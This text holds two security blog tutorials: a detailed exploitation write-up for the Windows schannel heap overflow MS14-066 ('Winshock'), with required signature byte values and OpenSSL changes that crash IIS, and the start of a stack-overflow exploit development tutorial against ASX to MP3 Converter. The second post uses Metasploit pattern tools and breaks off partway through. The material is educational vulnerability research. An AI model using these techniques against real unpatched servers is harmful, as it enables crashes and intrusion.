* [September 2014](https://www.securitysift.com/2014/09/)
* [July 2014](https://www.securitysift.com/2014/07/)
* [May 2014](https://www.securitysift.com/2014/05/)

### Pages

* [About](https://www.securitysift.com/about/)
* [My Library](https://www.securitysift.com/my-library/)
### Follow me on Twitter

[My Tweets](https://twitter.com/422832532212559872)

The views and and opinions expressed in this blog are my own and do not represent those of my previous or current employer. © Copyright 2025 Security Sift. All Rights Reserved,

---



=== Content from www.securitysift.com_c62a28da_20250124_115548.html ===


* [Home](https://www.securitysift.com/)
* [About](https://www.securitysift.com/about/)
* [My Library](https://www.securitysift.com/my-library/)

# [Security Sift](https://www.securitysift.com/)

Sifting through the world of Information Security, one bit at a time

Sift: to examine (something) thoroughly so as to isolate that which is most important -- Oxford Dictionary

Google
# Exploiting MS14-066 / CVE-2014-6321 (aka “Winshock”)

![](http://www.securitysift.com/wp-content/uploads/2012/09/mike_czumak.jpg)
Written on:[November 29, 2014](https://www.securitysift.com/2014/11/29/)
Comments are closed
### Introduction

I think enough time has passed now to provide a little more detail on how to exploit MS14-066 schannel vulnerability (aka “Winshock”). In this post I won’t be providing a complete PoC exploit, but I will delve into the details on exactly how to trigger the heap overflow along with some example modifications to OpenSSL so you can replicate the issue yourself.

This vulnerability was announced while I was on vacation so I didn’t have a chance to analyze it right away. Lucky for me, the research team at BeyondTrust posted this concise write-up, keying in on the vulnerable code: <http://blog.beyondtrust.com/triggering-ms14-066>. When I first looked at the specifics of the vulnerability, I admittedly discounted it’s severity solely for the fact that it seemed necessary to have some form of mutual certificate-based authentication to trigger — still a big deal but not as widespread as I first imagined (or so I thought). Then, a couple of days later, Malware Tech posted this gem: <http://www.malwaretech.com/2014/11/how-ms14-066-winshock-is-worse-than.html>. Wow…triggering the exploit on web servers even if they were set to ignore certificates definitely renewed my interest. @MalwareTechBlog subsequently released this nice write-up with additional details, but by that time I was already deep into examining the exploit (though it’s still worth a read if you haven’t already): <http://www.malwaretech.com/2014/11/ms14-066-in-depth-analysis.html>.

If you’ve already had a chance to read these sources, please bear with me, because for the sake of completeness, I will be repeating some of the information.

First, let’s take a closer look at the vulnerable function…

### schannel!DecodeSigAndReverse

Here is the disassembly for the pertinent portions of the DecodeSigAndReverse function (found in schannel.dll) which is responsible for decoding the encoded certificate signature.

[![ms14066_01-1](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_01-1-1024x779.png)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_01-1.png)

Of interest to us are the calls to CryptDecodeObject the the two subsequent calls to memcpy (found in the lower left yellow box), which is what ultimately triggers this vulnerability. I’ll get into more details but first it’s important to note that to trigger the vulnerable memcpy, we need to somehow force the server to verify a client-provided ECC certificate (as indicated by the cmp ebx, 2Fh instruction highlighted below).

[![ms14066_02](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_02-1024x562.png)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_02.png)

Most web servers will ignore a submitted client certificate (unless certificate authentication is required). However, as @MalwareTechBlog pointed out, vulnerable IIS servers will actually process a certificate that is forcefully presented regardless of the configured SSL settings. I’ll be demonstrating this vulnerability only for IIS on port 443, though you may be able to replicate similar results for RDP.

### The Setup

The first thing you’ll need to do to trigger this exploit is configure IIS SSL settings (I used a Win 7 box) as follows:

[![ms14066_03](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_03.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_03.jpg)

Generate a self-signed certificate (using OpenSSL), upload to your Windows box and bind it to your site:

[![ms14066_04](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_04.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_04.jpg)

Now generate an EC cert/key pair to use on your “attacking” machine. Next you’ll need to download the OpenSSL source. For my test setup I used version 1.0.1j on a Kali box. Since you’re probably going to be modifying and recompiling many times, you may want to use the .configure script to permanently set any desired build variables (such as install location).

Once you’ve got your web server configured, your client cert/key generated, and openSSL source downloaded, it’s time to make some modifications, specifically to s3\_clnt.c. First, we need to force the sending of our client certificate which can be done as follows:

[![ms14066_05](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_05-1024x886.png)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_05.png)

Notice I’ve altered the case statement logic to force a call to ssl3\_send\_client\_certificate.

Next you’ll need to force certificate verification, which can be done with the following modification to make a call to ssl3\_send\_client\_verify:

[![ms14066_06](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_06-1000x1024.png)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_06.png)

Connect a remote kernel debugger to your test IIS box and set a breakpoint on schannel!DecodeSigAndReverse. Then connect via the modified OpenSSL s\_client and you should trigger your breakpoint:

[![ms14066_39](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_391-1024x191.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_391.jpg)

[![ms14066_08](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_08.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_08.jpg)

Once you’ve confirmed you can enter the vulnerable function, it’s time to delve into the details to understand how to exploit it.

### A Closer Look

If you refer back to the disassembly of DecodeSigAndReverse, one of the the initial things to happen is the first of two calls to [CryptDecodeObject](http://msdn.microsoft.com/en-us/library/windows/desktop/aa379911%28v%3Dvs.85%29.aspx).

[![ms14066_07](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_07.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_07.jpg)This first call sets pvStructInfo to null to determine the size of the buffer needed to hold the decoded signature for proper memory allocation (which is handled by the subsequent call to SPExternalAlloc).

The second call to CryptDecodeObject is the one of interest.

[![ms14066_10](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_10-1024x243.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_10.jpg)

Testing this with an unmodified EC cert and key pair you should see something similar to the following for pcbStructInfo and pvStructInfo:

[![ms14066_09](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_09.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_09.jpg)

You can see before the call that the designated size is 50h and the pvStructInfo structure is 0’d out and ready to receive the decoded signature. cbEncoded holds the size of the encoded signature, which in this case is 46h. The encoded signature looks as follows:

[![ms14066_12](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_12.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_12.jpg)

\* Note: in the above pic, ebp+0ch shows the size of the encoded signature (46h) and the memory at location 002dc57b holds the encoded signature.

When the second CryptDecodeObject function returns, pvStructInfo now holds the decoded signature:

[![ms14066_13](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_13.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_13.jpg)

Now we can shift our attention to the two memcpy functions that follow.

[![ms14066_14](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_14.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_14.jpg)

The first memcpy will copy the number of bytes of the decoded signature designated in [esi] (in this case 20h or 32d) to a designated buffer (Dst). In the screenshot below, you can see that the contents of this buffer after the call to memcpy contain the first 32 bytes of the decoded signature returned by CryptDecodeObject.

[![ms14066_15](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_15.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_15.jpg)

Similarly, the second memcpy copies the remaining 32 bytes of the decoded signature to the adjacent reserved space in memory (Dst).

[![ms14066_16](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_16.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_16.jpg)

It’s the second memcpy function that is vulnerable to a heap overflow and will be the focus of our attention. To understand why it’s vulnerable to an overflow condition, we need to see how the destination buffer (Dst) is allocated which actually happens in the CheckClientVerifyMessage().

[![ms14066_17](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_17.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_18.jpg)

Notice in the third block below (before the call to DecodeSigAndReverse) is the call to SPExternalAlloc, which reserves the memory (Dst) where our decoded signature will be copied via the two calls to memcpy shown previously.

[![ms14066_19](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_19-1024x537.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_19.jpg)

You’ll recall each of those calls to memcpy copied 32 bytes (20h) of the decoded signature to adjacent portions of memory to fill a total of 40h bytes. This 40h bytes is reserved by SPExternalAlloc by taking the total key size (in this case 256 bits), dividing it by 8 (to convert to bytes) and doubling it (256 / 8 = 32 \* 2 = 64d or 40 h). The dangerous assumption here is that the decoded signature will always be twice the size of the key. We’re about to see why that’s not true.

### Modifying The Encoded Signature

The first thing we want to do is have some control over the size of the encoded signature represented by cbEncoded. If you refer to the call to CheckClientVerifyMessage(), you’ll notice that cbEncoded is passed as a parameter, which means we need to back up even further to the function DigestCertVerify().

[![ms14066_21](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_21-1024x191.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_21.jpg)

We can see at location 0xXXXX98CE of DigestCertVerify that cbEncoded is located at [esi+1]. It turns out [esi] merely points to the start of the encoded signature structure which looks like this:

[![ms14066_22](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_22.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_22.jpg)

Notice [esi+1] holds the value of cbEncoded (47h). The bytes that follow make up the encoded signature that will eventually be passed to CrypteDecodeObject() within DecodeSigAndReverse(). Here is a look at that call so you can see they are identical:

[![ms14066_23](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_23.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_23.jpg)

The structure that holds our encoded signature is [defined on MSDN](http://msdn.microsoft.com/en-us/windows/aa377194%28v%3Dvs.71%29.aspx) as follows:

[![ms14066_26](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_26-1024x477.png)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_26.png)

For the purpose of this demo, I’ll call this structure sig. We’ve identified the total size of sig by the byte located at sig[1]. Structure members r and s are decoded and copied via the two memcpy operations. What’s even more interesting is that two other bytes of sig (which is under our control) dictate the size of r and s used in each memcpy operation.

[![ms14066_24](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_24.png)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_24.png)

This means we have control over how many bytes are written via each memcpy and can use that to overwrite the reserved heap buffer. In addition, other than a few required byte values, the majority of the encoded signature is irrelevant, meaning we can inject any values we wish.

In addition, submitting an invalid encoded signature to CryptDecodeObject doesn’t result in an error. Instead, it simply returns the invalid encoded signature that we passed it and that data is subsequently written to the heap via the vulnerable memcpy functions. This means we can predict the subsequent return values that will be passed to the vulnerable memcpy functions and written via the heap overflow.

From my brief testing, I identified the following required values for sig:

* sig[1] = cbEncoded (total size of sig); my testing indicates that max size is \x81
* sig[2] = \x30; required (leave unchanged)
* sig[3] = (sig[1] -1); max size is \x7f
* sig[4] = \x02; appears to represent data type that follows
* sig[5] = size of r or memcpy 1; minimum value is 1
* sig[6] = any single byte value such as \x00
* sig[7] = \x02; appears to represent data type that follows
* sig[8] = sig[1] – 7 = \x7a
* sig[9]…sig[x] = any arbitrary values for heap oveflow

### Triggering the Exploit

So, how can we influence the encoded signature value? Rather than changing the content of the certificate, we can modify the encoded signature directly in OpenSSL via the ssl3\_send\_client\_verify function.

[![ms14066_38](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_38-811x1024.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_38.jpg)

A couple things to note about the above modified signature. The first memcpy is represented by the three bytes at psig[2] – psig[4] (\x02\x01\x00). Again, I believe the first byte to represent the data type, the second byte is the size for memcpy, and the third byte is the content (src) to write. A single byte of \x00 will result in the first memcpy writing 32 null bytes to the first half of the reserved 64 bytes.

The next 32 bytes as well as up to 90 additional bytes will be consumed by what follows psig[7] and psig[8]. This is what results in the heap overflow.

For purposes of illustration, notice I changed the total size of the signature to a much larger value of 15,500. Although CryptDecodeObject limits the size of the total signature it will process (again, my testing indicated the limit is \x81), DecodeSigAndReverse accepts much larger values for the encoded signature (pbEncoded) which means arbitrary data can be written to memory before it’s processed by CryptDecodeObject Note: it appears that DecodeSigAndReverse properly allocates memory for the encoded signature and none of my tests resulted in an overflow condition as a result submitting a large signature; however, being able to write 10,000+ bytes of arbitrary data may come in handy.

You can see an example of this below:

[![ms14066_25](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_25.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_25.jpg)

Following this through to the memcpy functions, the resulting heap overflow looks as follows:

[![ms14066_36](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_36-2.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_36-2.jpg)

Not surprisingly, this overflow results in an Access Violation (yours may vary).

[![ms14066_37](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_37-2.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_37-2.jpg)

[![ms14066_40](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_40-1024x854.png)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_40.png)

One thing to note about this basic demonstration is that the heap overflow may not be triggered immediately nor will the access violation caused by this simple demo be consistent. I found you can typically trigger it at-will by establishing another (valid) connection via an unmodified version of OpenSSL s\_client. Here’s a quick 30 second video demonstrating what it looks like on the target machine.

As I said earlier, I won’t be providing a full working exploit PoC at this time nor will I be uploading my modified version of OpenSSL. That said, the information in this post should be more than enough to understand how this vulnerability can be exploited (though reliability will be a factor) and you may think of additional methods of exploitation. Regardless, this simple demo is still enough to interrupt IIS services and reboot the target machine so please do not test it against any servers unless you have explicit permission to do so!

### Conclusion

To recap, the second memcpy found in schannel!DecodeSigAndReverse is vulnerable to a heap overflow condition due to the presumption of the decoded signature size (twice the size of the key) made in the calling function CheckClientVerifyMessage. Since we can control (to a degree) the size and content of the memcpy function (via the encoded signature) and CryptDecodeObject leaves the encoded signature input untouched, we can predict the values written in the heap overflow. This can all be triggered via some basic modification to OpenSSL.

Hopefully this gave you some additional insight into how this vulnerability can be triggered and exploited, and as always, apply those patches if you haven’t already!

Until next time,

Mike

[Follow @securitysift](http://twitter.com/securitysift)

### Share this:

* [Twitter](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/?share=twitter "Click to share on Twitter")
* [Facebook](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/?share=facebook "Click to share on Facebook")
* [LinkedIn](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/?share=linkedin "Click to share on LinkedIn")
* Email
* [Pinterest](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/?share=pinterest "Click to share on Pinterest")
* [Reddit](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/?share=reddit "Click to share on Reddit")

In category: [Exploits](https://www.securitysift.com/category/exploits/)

### 55 Comments [add one](#leave-comment)

Previous post: [Windows OLE RCE Exploit MS14-060 (CVE-2014-4114) – Sandworm](https://www.securitysift.com/windows-ole-rce-exploit-ms14-060/)

Next post: [Developing a Security Assessment Program](https://www.securitysift.com/developing-a-security-assessment-program/)

Connect with me...
[![]( https://www.securitysift.com/wp-content/themes/news-leak/images/rss.png)](http://www.securitysift.com/?feed=rss) [![]( https://www.securitysift.com/wp-content/themes/news-leak/images/in.png)](www.linkedin.com/in/michaelczumak%20) [![]( https://www.securitysift.com/wp-content/themes/news-leak/images/tweeter.png)](https://twitter.com/SecuritySift) [![]( https://www.securitysift.com/wp-content/themes/news-leak/images/face.png)](https://www.facebook.com/secsift)

* Most Popular Posts
* Random Posts

* [Offensive Security’s PWB and OSCP — My Experience](https://www.securitysift.com/offsec-pwb-oscp/ "Offensive Security’s PWB and OSCP — My Experience")October 9, 2013
* [Exploiting MS14-066 / CVE-2014-6321 (aka “Winshock”)](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/ "Exploiting MS14-066 / CVE-2014-6321 (aka “Winshock”)")November 29, 2014
* [Windows Exploit Development – Part 2: Intro to Stack Based Overflows](https://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/ "Windows Exploit Development – Part 2: Intro to Stack Based Overflows")December 13, 2013
* [peCloak.py – An Experiment in AV Evasion](https://www.securitysift.com/pecloak-py-an-experiment-in-av-evasion/ "peCloak.py – An Experiment in AV Evasion")March 9, 2015
* [Phishing with Macros and Powershell](https://www.securitysift.com/phishing-with-macros-and-powershell/ "Phishing with Macros and Powershell")May 22, 2015

* [Windows Exploit Development – Part 2: Intro to Stack Based Overflows](https://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/)December 13, 2013
* [ASK/L(OOK)/Listen! – Basic Signal Decoding and Replay](https://www.securitysift.com/ook-signal-decoding-replay/)September 1, 2017
* [Solving the 2014 DBIR Puzzle Challenge](https://www.securitysift.com/solving-2014-dbir-puzzle-challenge/)May 6, 2014
* [Offensive Security’s PWB and OSCP — My Experience](https://www.securitysift.com/offsec-pwb-oscp/)October 9, 2013
* [XSS with a little help from ASP.NET and IE9](https://www.securitysift.com/xss-and-cross-site-scripting-with-a-little-help-from-asp-net-and-ie9/)September 10, 2012

### Categories

* [Breaches](https://www.securitysift.com/category/breaches/)
* [Exploits](https://www.securitysift.com/category/exploits/)
* [Opinion](https://www.securitysift.com/category/opinion/)
* [Pentesting](https://www.securitysift.com/category/pentesting/)
* [Puzzles](https://www.securitysift.com/category/puzzles/)
* [Training/Certifications](https://www.securitysift.com/category/trainingcertifications/)
* [Uncategorized](https://www.securitysift.com/category/uncategorized/)
* [Web Security](https://www.securitysift.com/category/web-security/)

### Archives

* [October 2017](https://www.securitysift.com/2017/10/)
* [September 2017](https://www.securitysift.com/2017/09/)
* [May 2015](https://www.securitysift.com/2015/05/)
* [April 2015](https://www.securitysift.com/2015/04/)
* [March 2015](https://www.securitysift.com/2015/03/)
* [February 2015](https://www.securitysift.com/2015/02/)
* [December 2014](https://www.securitysift.com/2014/12/)
* [November 2014](https://www.securitysift.com/2014/11/)
* [October 2014](https://www.securitysift.com/2014/10/)
* [September 2014](https://www.securitysift.com/2014/09/)
* [July 2014](https://www.securitysift.com/2014/07/)
* [May 2014](https://www.securitysift.com/2014/05/)

### Pages

* [About](https://www.securitysift.com/about/)
* [My Library](https://www.securitysift.com/my-library/)
### Follow me on Twitter

[My Tweets](https://twitter.com/422832532212559872)

The views and and opinions expressed in this blog are my own and do not represent those of my previous or current employer. © Copyright 2025 Security Sift. All Rights Reserved,

---



=== Content from www.securitysift.com_2c0d7048_20250126_005639.html ===


* [Home](https://www.securitysift.com/)
* [About](https://www.securitysift.com/about/)
* [My Library](https://www.securitysift.com/my-library/)

# [Security Sift](https://www.securitysift.com/)

Sifting through the world of Information Security, one bit at a time

Sift: to examine (something) thoroughly so as to isolate that which is most important -- Oxford Dictionary

Google
# Windows Exploit Development – Part 2: Intro to Stack Based Overflows

![](http://www.securitysift.com/wp-content/uploads/2012/09/mike_czumak.jpg)
Written on:[December 13, 2013](https://www.securitysift.com/2013/12/13/)
Comments are closed
### Overview

Welcome to Part 2 of my Windows Exploit Development series.  In the first post, I covered some basic concepts that should be considered pre-requisites for continuing with Part 2 and beyond. If you haven’t done so, I recommend at least taking a cursory look at the first post to ensure you’ve got a firm grasp on all of the concepts presented. Building on that knowledge, I now want to talk about an all-too-common Windows-based software vulnerability: the stack-based buffer overflow.

### Introduction to Stack-Based Buffer Overflows

In this installment, I’m going to pick up where we left off with the following simple program [from Wikipedia](http://en.wikipedia.org/wiki/Stack_buffer_overflow "Stack Overflow Function | Wikipedia"):

[![strcpy](http://www.securitysift.com/wp-content/uploads/2013/12/strcpy_from_wikipedia.png)](http://www.securitysift.com/wp-content/uploads/2013/12/strcpy_from_wikipedia.png)

In Part 1, I alluded to the fact that passing an argument greater than 11 characters to the strcpy( ) function would lead to a buffer overflow due to lack of bounds checking.  Let’s see exactly what that means.  Recall how strcpy( ) writes the argv[1] user input to the stack as follows:

[![strcpy2](http://www.securitysift.com/wp-content/uploads/2013/12/strcpy2.png)](http://www.securitysift.com/wp-content/uploads/2013/12/strcpy2.png)

This is fine if the input is less than 12 characters (the size allotted to the stack for variable c in function foo), but if the input exceeds 11 characters, strcpy( ) will continue writing the input to the stack, no matter how much space has been allocated. [Side note: In case you’re wondering why the input character limit is 11 and not 12 (since the variable size is 12), it’s because you must allocate for the automatic string terminator.]

For example, if we were to run this program with an argument of 150 A’s we’d end up with a stack that looks like this:

[![strcpy_bof1](http://www.securitysift.com/wp-content/uploads/2013/12/strcpy_bof1.png)](http://www.securitysift.com/wp-content/uploads/2013/12/strcpy_bof1.png)

As you can see, strcpy( ) has overwritten all of the the base pointers (saved EBP) and return addresses (saved EIP) with argv[1].  Note: don’t worry about the Pointer to the next SEH record and SE handler — I’ll cover them in a future post. Now when the program diverts execution to one of the saved EIP addresses, it will try to follow 41414141 (AAAA) and raise and error/exception.

[![strcpy_bof2](http://www.securitysift.com/wp-content/uploads/2013/12/strcpy_bof2.png)](http://www.securitysift.com/wp-content/uploads/2013/12/strcpy_bof2.png)

Again, this is because strcpy( ) does not employ bounds checking so it does not validate the space allocated for variable c and will continue to write to the stack until argv[1] has been written in its entirety. Since local variables are written to the stack above saved return addresses and other important data, and argv[1] is written down the stack, EIP will be overwritten with A’s.

[![strcpy_bof_diagram](http://www.securitysift.com/wp-content/uploads/2013/12/strcpy_bof_diagram.png)](http://www.securitysift.com/wp-content/uploads/2013/12/strcpy_bof_diagram.png)

Since we (the user) have complete control over the argument we pass to the program, thanks to this stack-based buffer overflow, we also have complete control over EIP and as a result, the execution flow of the program itself.  That means we can redirect the program from its intended course to execute code of our choosing — this is a simple example of a stack-based buffer overflow vulnerability.  Let’s take a look at an actual program with a similar buffer overflow flaw.

### Finding a vulnerable application

Let me this opportunity to introduce Exploit Database ([http://www.exploit-db.com/](http://www.exploit-db.com/ "Exploit Database")), an archive of exploits which in many cases also includes the associated vulnerable software available for download. It’s a great resource for exploit development as well as a great place to submit your own written exploits. In a future post, I’ll discuss how to find your own software exploits but for this intro demonstration let’s use an existing one.

For this example, I’m going to refer to an older [Proof of Concept buffer overflow exploit for ASX to MP3 Converter](http://www.exploit-db.com/exploits/8407/ "ASX to MP3 Converter (.M3U File) Local Stack Overflow PoC | Exploit-DB") submitted in 2009 by Cyber-Zone.  Take a look at the code posted to Exploit-DB and note the EIP overwrite (41414141) after opening a music playlist file (.m3u) containing “http://” + 26,121 A’s. Now because this is a POC, it doesn’t actually result in successful code execution (just a program crash). Also note that this POC doesn’t indicate which version of the software is vulnerable and it was written on Windows XP SP2 French, meaning we could see different results on an alternate version of the OS. With all that in mind, lets [download ASX to MP3 Converter version 3.0.0.7](http://asx-to-mp3-converter.en.softonic.com/ "Download ASX to MP3 Converter") and install it on Windows XP SP3.

### Replicating the vulnerability/crash

Next let’s start to build our exploit and replicate the application crash from the POC.  I’m going to write this exploit in Perl.

[![asx2mp3_sploit_1](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit_1.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit_1.png)

As you can see, the Perl script creates an m3u file containing 50,000 A’s (41 is ‘A’ in hex — see [http://www.asciitable.com/](http://www.asciitable.com/ "ASCII Conversion Table")). Note that for this m3u exploit, the “http://” included in the original POC is not required, though some m3u-based exploits do require a similar location/path to work. You can research the contents/header of a valid m3u file to understand why this might be. Also note that with this exploit, the path to where the m3u exploit file is saved influences the eventual EIP overwrite so be sure name the exploit file the same as in my example (asx2mp3.m3u) and save it to the root of the C:\ drive before you open it in ASX to MP3 converter.

Run the perl script (e.g. perl asx2mp3.pl) to produce the exploit m3u file and save it to the C:\ drive of the target Windows machine. Then open ASX to MP3 Converter and attach Immunity Debugger (be sure to press F9 to run the program).

[![Attach ASX to MP3 Converter](http://www.securitysift.com/wp-content/uploads/2013/12/immunity_attach_asx.png)](http://www.securitysift.com/wp-content/uploads/2013/12/immunity_attach_asx.png)

Open the asx2mp3.m3u exploit file with ASX to MP3 player (by dragging it to the application) and you should see an immediate application crash and resulting EIP overwrite in Immunity.

[![asx2mp3_sploit_0](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit_0-2.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit_0-2.png)

[![ASX2MP3_immunity_1](http://www.securitysift.com/wp-content/uploads/2013/12/ASX2MP3_immunity_1.png)](http://www.securitysift.com/wp-content/uploads/2013/12/ASX2MP3_immunity_1.png)

### Controlling the EIP overwrite (Determine the Offset)

Ok, so we’ve confirmed the POC crash.  Now, in order to take control of program execution and make this exploit functional the first thing we need to do is figure out at what point in our 50,000 character buffer EIP is overwritten (also known as the “offset”).  We could do this via trial and error by constructing our buffer with multiple characters (such as 10,000 each of A’s, B’s, C’s, D’s, and E’s) and see where EIP is overwritten as I illustrated below.

[![asx2mp3_sploit_2](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit_2.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit_2.png)

[![asx2mp3_immunity2](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity2.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity2.png)

EIP was overwritten by C’s, so from here you could focus on characters 20,001 to 30,000, breaking them down in smaller increments until you find the exact 4 bytes that overwrite EIP. While effective, this method can take some time and there is an easier way. Instead of multiple trial and error attempts we can find the exact EIP overwrite using Metasploit pattern\_create/pattern\_offset functions (which you can find on Backtrack/Kali Linux).

```
root@kali:/# locate *pattern_*.rb
/usr/share/metasploit-framework/tools/pattern_create.rb
/usr/share/metasploit-framework/tools/pattern_offset.rb
```

Using pattern\_create, I’ll create a pattern of length 50,000, insert that into my script and create a new m3u exploit file.

```
root@kali:/# /usr/share/metasploit-framework/tools/pattern_create.rb 50000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad...
```

[![asx2mp3_sploit_3](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit_3.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit_3.png)

Restart ASX to MP3 Converter in Immunity (Ctrl + F2), open your newly created m3u file (from the root of C:\) and examine the crash in Immunity. This time we get an EIP overwrite of 48376D48.

[![asx2mp3_immunity_3](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity_3.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity_3.png)

To find the exact offset of this EIP overwrite within our 50,000 character buffer, we’ll use pattern\_offset.rb.  The syntax is as follows:

```
root@kali:/# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x48376D48 50000
```

[![asx2mp3_sploit4](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit4.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit4.png)

In this case, the actual offset is the second listed (26121), which is the same as in the original POC posted to Exploit-DB.com.  We can test this by modifying our script as follows:

[![asx2mp3_sploit_5-1](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit_5-1.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit_5-1.png)

In the above script, I added a variable $junk which holds 26,121 A’s — our offset to EIP.  The next four bytes should overwrite EIP exactly (I’ve chosen four B’s) and the remainder of the 50,000 character buffer is filled with C’s.  Re-running the vulnerable app with the updated m3u file confirms the offset to EIP and it is overwritten with the 4 B’s as hoped.  You can also see the contents of our buffer in the stack and memory dump panes.

[![asx2mp3_immunity_4](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity_4.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity_4.png)

Let’s take a look at another way to generate a pattern and calculate the offset, this time using the [Mona plugin for Immunity](http://redmine.corelan.be/projects/mona "Mona Plugin for Immunity | Corelan"). Once you have the plugin saved to the PyCommands folder of Immunity, launch ASX to MP3 converter from within the debugger.

If you want to use mona to generate the metasploit pattern, you can type *!mona pc 50,000*and it will write the pattern to a text file .  Since I do most of my exploit writing on a separate Kali machine, I prefer to use pattern\_create.rb. Either way, once you’ve created your exploit m3u file containing the 50,000 byte pattern and cause the application to crash within Immunity you can now use the findmsp mona command. With this command (!mona findmsp) mona will locate the EIP overwrite as well as other very useful information such as which registers contain portions of your buffer.  If you were to run the *!mona findmsp* command your output should look something like this:

[![findmsp1](http://www.securitysift.com/wp-content/uploads/2013/12/findmsp1.png)](http://www.securitysift.com/wp-content/uploads/2013/12/findmsp1.png)

Notice how it only found one EIP pattern at offset 5841 which might look familiar as it was the first of three pattern matches found by the Metasploit pattern\_offset.rb script I showed earlier.  This is because out-of-the-box, the findmsp function in mona.py looks for the offset using the python find( ) function as follows:

```
offset = regpattern.find(hexpat))
```

If you’re familiar with python, the find function only returns the first occurrence of a match, not all occurrences. In our case, we are actually interested in the second match to determine the correct offset. I updated my copy of mona to use regular expressions (instead of the find function) and loop through all occurrences of a pattern match to construct a concatenated string of all offsets.  If you’re interested, the basic code follows (though I should warn you this is a hack and some additional code changes are required):

```
match in re.finditer(hexpat, regpattern):
    if offsetstr != "":
        divisor = " and "
    offsetstr = offsetstr + divisor + match.start( )

    ...

    [be sure to edit dbg.log to write offsetstr as %s]
```

This will result in the following output:

